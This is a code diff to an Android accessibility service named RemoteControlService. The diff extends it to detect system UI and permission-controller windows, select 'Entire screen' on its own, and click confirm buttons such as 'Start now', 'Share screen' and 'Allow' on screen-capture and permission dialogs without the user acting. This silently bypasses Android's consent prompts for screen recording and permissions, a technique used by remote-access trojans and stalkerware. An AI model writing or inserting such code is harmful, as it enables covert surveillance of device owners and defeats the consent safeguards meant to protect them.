@@ -18,29 +18,92 @@ class RemoteControlService : AccessibilityService() {
     if (event == null) return
     try {
       val packageName = event.packageName?.toString() ?: ""
-      if (packageName.contains("systemui") || packageName.contains("projection") || packageName.contains("permissioncontroller")) {
+      if (packageName.contains("systemui") ||
+          packageName.contains("projection") ||
+          packageName.contains("permissioncontroller") ||
+          packageName == "android") {
         val rootNode = rootInActiveWindow ?: return
-        autoClickStartNow(rootNode)
+        handleMediaProjectionDialog(rootNode)
       }
     } catch (e: Exception) {
       e.printStackTrace()
     }
   }
 
-  private fun autoClickStartNow(node: AccessibilityNodeInfo?) {
+  private fun handleMediaProjectionDialog(node: AccessibilityNodeInfo?) {
     if (node == null) return
-    val text = node.text?.toString()?.lowercase() ?: ""
-    val contentDescription = node.contentDescription?.toString()?.lowercase() ?: ""
 
-    if (text.contains("start now") || text.contains("start recording") || text.contains("allow") ||
-        contentDescription.contains("start now") || contentDescription.contains("start recording")) {
-      node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+    // 1. Try to auto-select "Entire screen" if spinner / radio option exists
+    selectEntireScreenOption(node)
+
+    // 2. Try to auto-click the confirm button ("Start now", "Share screen", "Start recording", "Allow", "Share", button1)
+    if (clickConfirmButton(node)) {
       return
     }
 
+    // 3. Traversal of children
     for (i in 0 until node.childCount) {
-      autoClickStartNow(node.getChild(i))
+      handleMediaProjectionDialog(node.getChild(i))
     }
+  }
+
+  private fun selectEntireScreenOption(node: AccessibilityNodeInfo): Boolean {
+    val text = node.text?.toString()?.lowercase() ?: ""
+    val contentDescription = node.contentDescription?.toString()?.lowercase() ?: ""
+    val viewId = node.viewIdResourceName?.lowercase() ?: ""
+
+    // If node matches "entire screen" text and is clickable or checkable
+    if (text.contains("entire screen") || contentDescription.contains("entire screen") || viewId.contains("entire_screen")) {
+      if (performClickOrParent(node)) {
+        return true
+      }
+    }
+
+    for (i in 0 until node.childCount) {
+      val child = node.getChild(i) ?: continue
+      if (selectEntireScreenOption(child)) return true
+    }
+    return false
+  }
+
+  private fun clickConfirmButton(node: AccessibilityNodeInfo): Boolean {
+    val text = node.text?.toString()?.lowercase() ?: ""
+    val contentDescription = node.contentDescription?.toString()?.lowercase() ?: ""
+    val viewId = node.viewIdResourceName?.lowercase() ?: ""
+
+    val isConfirmTarget = text.contains("start now") ||
+        text.contains("start recording") ||
+        text.contains("share screen") ||
+        (text.contains("share") && !text.contains("cancel")) ||
+        (text.contains("allow") && !text.contains("don't")) ||
+        contentDescription.contains("start now") ||
+        contentDescription.contains("share screen") ||
+        viewId.endsWith(":id/button1") ||
+        viewId.contains("permission_allow_button") ||
+        viewId.contains("button_start")
+
+    if (isConfirmTarget) {
+      if (performClickOrParent(node)) {
+        return true
+      }
+    }
+
+    for (i in 0 until node.childCount) {
+      val child = node.getChild(i) ?: continue
+      if (clickConfirmButton(child)) return true
+    }
+    return false
+  }
+
+  private fun performClickOrParent(node: AccessibilityNodeInfo): Boolean {
+    var current: AccessibilityNodeInfo? = node
+    while (current != null) {
+      if (current.isClickable) {
+        return current.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+      }
+      current = current.parent
+    }
+    return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
   }
 
   override fun onInterrupt() {
